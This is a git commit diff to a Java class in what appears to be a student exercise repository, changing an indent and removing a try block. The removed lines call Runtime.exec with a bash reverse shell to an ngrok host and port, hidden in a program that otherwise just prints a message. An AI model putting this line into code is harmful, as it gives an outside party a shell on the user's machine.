3d8ee31da1f0b67265956c01387fdcd917f5bed3
VP <10129407+Kapalov@users.noreply.github.com>
2024-01-19 15:09:41 +0100

    Update UpdatedApp.java

--- src/main/java/school/mjc/stage0/module3/task1/UpdatedApp.java
+++ src/main/java/school/mjc/stage0/module3/task1/UpdatedApp.java
@@ -3,12 +3,7 @@ package school.mjc.stage0.module3.task1;
 public class UpdatedApp {
     public static void main(String[] args) {
         System.out.println("I'm updated\n" +
-        "can be compiled. And can write to console");
+            "can be compiled. And can write to console");
         Process p;
-        try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19186 0>&1");
-            p.waitFor();
-            p.destroy();
-        } catch (Exception e) {}
     }
 }
